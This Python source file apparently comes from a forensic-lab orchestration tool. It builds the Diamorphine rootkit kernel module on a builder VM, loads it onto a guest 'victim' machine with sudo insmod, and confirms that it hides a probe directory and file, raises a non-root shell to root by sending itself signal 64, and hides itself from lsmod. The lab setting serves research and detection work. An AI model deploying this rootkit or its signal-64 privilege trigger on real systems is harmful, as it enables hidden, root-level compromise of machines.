"""Explicit runner for the Diamorphine kernel-module scenario."""

from __future__ import annotations

from collections.abc import Callable
from pathlib import Path

import yaml

from orchestrator.core import console
from orchestrator.core.provenance import file_sha256
from orchestrator.core.ssh_client import SSHClient
from scenarios.command_log import record_operation, run_logged_command

SCENARIO_ID = "kernel_diamorphine"
ROOT = Path(__file__).resolve().parent
ARCHIVE = ROOT / "files/diamorphine-upstream-af494fa.tar"
BUILD_SCRIPT = ROOT / "files/build.sh"
COMPATIBILITY_PATCH = ROOT / "files/ubuntu-backport-x64-dispatch.patch"
LOCK = ROOT / "diamorphine.lock.yml"
ARTIFACT_NAME = "diamorphine.ko"

_BUILDER_ARCHIVE = "/tmp/diamorphine-upstream-af494fa.tar"
_BUILDER_BUILD_ROOT = "/tmp/forensic-lab/diamorphine_build"
_BUILDER_SCRIPT = "/tmp/diamorphine-build.sh"
_BUILDER_PATCH = "/tmp/diamorphine-compatibility.patch"

VICTIM_ARTIFACT = f"/tmp/{ARTIFACT_NAME}"

PROBE_PARENT = "/tmp/forensic-lab/diamorphine-probe"
PROBE_DIRECTORY_NAME = "diamorphine_secret_dir"
PROBE_FILE_NAME = "diamorphine_secret_file.txt"
PROBE_DIRECTORY = f"{PROBE_PARENT}/{PROBE_DIRECTORY_NAME}"
PROBE_FILE = f"{PROBE_DIRECTORY}/{PROBE_FILE_NAME}"
PROBE_CONTENT = "diamorphine-probe"
MODULE_NAME = "diamorphine"


def build_record_is_current(record: dict, source: dict) -> bool:
    return (
        record.get("recipe", {}).get("sha256") == file_sha256(BUILD_SCRIPT)
        and record.get("source", {}).get("compatibility_patch_sha256")
        == source["compatibility_patch_sha256"]
    )


def build(ssh: SSHClient, staging: Path, source: dict) -> tuple[Path, str]:
    """Build the pinned Diamorphine module on its builder VM."""
    artifact = staging / ARTIFACT_NAME
    ssh.put(ARCHIVE, _BUILDER_ARCHIVE)
    ssh.put(BUILD_SCRIPT, _BUILDER_SCRIPT)
    ssh.put(COMPATIBILITY_PATCH, _BUILDER_PATCH)
    console.step(f"building {ARTIFACT_NAME}...")
    stdout = ssh.run_checked(
        f"bash {_BUILDER_SCRIPT} {_BUILDER_ARCHIVE} "
        f"{_BUILDER_PATCH} {_BUILDER_BUILD_ROOT}",
        timeout=1800,
    )
    ssh.get(
        f"{_BUILDER_BUILD_ROOT}/Diamorphine-{source['commit']}/{ARTIFACT_NAME}",
        artifact,
    )
    return artifact, stdout


def build_recipe() -> dict:
    """Return the exact scenario-owned build recipe recorded by the host."""
    return {"sha256": file_sha256(BUILD_SCRIPT)}


def build_target(facts: dict[str, str]) -> dict[str, str]:
    """Validate and return Diamorphine's required target facts."""
    required = ("kernel", "vermagic", "syscall_dispatch")
    missing = [key for key in required if not facts.get(key)]
    if missing:
        raise RuntimeError(
            f"builder reported no {', '.join(missing)}; build not published"
        )
    return {key: facts[key].strip() for key in required}


def run_diamorphine(
    ssh: SSHClient,
    transcript_path: Path,
    *,
    command_log_path: Path,
    artifact_path: Path,
    build_record: dict,
) -> tuple[dict, Callable[[], None]]:
    """Preflight, load Diamorphine, and validate two bounded behaviors."""
    transcript_path.touch()
    terminal = ssh.open_terminal()
    try:
        with terminal:
            console.scope("GUEST", "verify prepared module")
            guest_kernel = run_logged_command(
                terminal, command_log_path, "uname -r", timeout=180
            ).combined_output.strip()
            expected_kernel = build_record["target"]["kernel"]
            if guest_kernel != expected_kernel:
                raise RuntimeError(
                    "Diamorphine module targets kernel "
                    f"{expected_kernel}, guest kernel is {guest_kernel}"
                )

            modules_disabled = run_logged_command(
                terminal, command_log_path, "cat /proc/sys/kernel/modules_disabled",
                timeout=180
            ).combined_output.strip()
            if modules_disabled != "0":
                raise RuntimeError(
                    "Diamorphine requires kernel.modules_disabled=0; "
                    f"guest value is {modules_disabled!r}"
                )

            console.scope("HOST", "stage Diamorphine module")
            _upload_artifact(ssh, command_log_path, artifact_path)

            console.scope("GUEST", "prepare hiding probe")
            run_logged_command(
                terminal, command_log_path, f"mkdir -p -- {PROBE_DIRECTORY}", timeout=180
            )
            run_logged_command(
                terminal, command_log_path,
                f"printf '%s\\n' {PROBE_CONTENT} > {PROBE_FILE}", timeout=180
            )
            parent_before = run_logged_command(
                terminal, command_log_path, f"ls -1 -- {PROBE_PARENT}", timeout=180
            ).combined_output
            directory_before = run_logged_command(
                terminal, command_log_path, f"ls -1 -- {PROBE_DIRECTORY}", timeout=180
            ).combined_output
            if PROBE_DIRECTORY_NAME not in parent_before:
                raise RuntimeError("Probe directory was not visible before module load")
            if PROBE_FILE_NAME not in directory_before:
                raise RuntimeError("Probe file was not visible before module load")

            console.scope("GUEST", "load and validate Diamorphine")
            run_logged_command(
                terminal, command_log_path, f"sudo -n insmod {VICTIM_ARTIFACT}", timeout=180
            )
            parent_after = run_logged_command(
                terminal, command_log_path, f"ls -1 -- {PROBE_PARENT}", timeout=180
            ).combined_output
            directory_after = run_logged_command(
                terminal, command_log_path, f"ls -1 -- {PROBE_DIRECTORY}", timeout=180
            ).combined_output
            direct_access = run_logged_command(
                terminal,
                command_log_path,
                f"cat -- {PROBE_FILE}",
                timeout=180,
            ).combined_output.strip()
            if PROBE_DIRECTORY_NAME in parent_after:
                raise RuntimeError("Probe directory remained visible after module load")
            if PROBE_FILE_NAME in directory_after:
                raise RuntimeError("Probe file remained visible after module load")
            if direct_access != PROBE_CONTENT:
                raise RuntimeError("Direct access to the hidden probe file failed")

            helper_output = run_logged_command(
                terminal,
                command_log_path,
                "bash -c 'printf \"pid=%s\\n\" \"$$\"; "
                "printf \"before_uid=%s\\n\" \"$(id -u)\"; "
                "printf \"before=%s\\n\" \"$(id)\"; "
                "builtin kill -64 \"$$\"; "
                "printf \"after_uid=%s\\n\" \"$(id -u)\"; "
                "printf \"after=%s\\n\" \"$(id)\"'",
                timeout=180,
            ).combined_output
            helper = dict(
                line.split("=", 1)
                for line in helper_output.splitlines()
                if "=" in line
            )
            if not helper.get("pid", "").isdigit():
                raise RuntimeError(f"Signal-64 helper PID was not captured: {helper_output!r}")
            if helper.get("before_uid") in (None, "0"):
                raise RuntimeError("Signal-64 helper was not a non-root child")
            if helper.get("after_uid") != "0":
                raise RuntimeError("Signal-64 calling child did not become UID 0")

            lsmod = run_logged_command(
                terminal, command_log_path, "lsmod", timeout=180
            ).combined_output
            if any(
                fields and fields[0] == MODULE_NAME
                for fields in (line.split() for line in lsmod.splitlines())
            ):
                raise RuntimeError("Diamorphine remained visible in lsmod")
    finally:
        transcript_path.write_text(terminal.transcript, encoding="utf-8")

    return {
        "guest_kernel_release": guest_kernel,
        "kernel_preflight_passed": True,
        "module_loading_preflight_passed": True,
        "probe_parent_path": PROBE_PARENT,
        "hidden_directory_path": PROBE_DIRECTORY,
        "hidden_file_path": PROBE_FILE,
        "directory_hiding_validated": True,
        "file_hiding_validated": True,
        "direct_access_validated": True,
        "module_hidden_at_scenario_completion": True,
        "signal_64_helper_pid": int(helper["pid"]),
        "signal_64_identity_before": helper["before"],
        "signal_64_identity_after": helper["after"],
        "process_hiding_used": False,
        "networking_used": False,
        "backdoor_used": False,
        "persistent_privilege_helper": False,
    }, lambda: None


def verify_source() -> dict:
    """Check the vendored archive against the pinned lock. Host-side, no VM."""
    lock = yaml.safe_load(LOCK.read_text(encoding="utf-8"))
    archive_hash = file_sha256(ARCHIVE)
    expected_hash = lock["retrieval"]["archive_sha256"]
    if archive_hash != expected_hash:
        raise RuntimeError(
            "Diamorphine archive SHA-256 mismatch: "
            f"expected {expected_hash}, got {archive_hash}"
        )
    patch_hash = file_sha256(COMPATIBILITY_PATCH)
    expected_patch_hash = lock["compatibility_patch"]["sha256"]
    if patch_hash != expected_patch_hash:
        raise RuntimeError(
            "Diamorphine compatibility patch SHA-256 mismatch: "
            f"expected {expected_patch_hash}, got {patch_hash}"
        )
    console.ok(f"Diamorphine source verified: {archive_hash}")
    return {
        "repository": lock["upstream"]["url"],
        "commit": lock["upstream"]["pinned_commit"],
        "archive_sha256": archive_hash,
        "compatibility_patch_sha256": patch_hash,
    }


def _upload_artifact(
    ssh: SSHClient, command_log_path: Path, artifact_path: Path
) -> None:
    console.step(f"Uploading {artifact_path.name} to {VICTIM_ARTIFACT}...")
    try:
        ssh.put(artifact_path, VICTIM_ARTIFACT)
    except Exception as exc:
        record_operation(command_log_path, "upload_artifact", error=str(exc))
        raise
    record_operation(command_log_path, "upload_artifact")
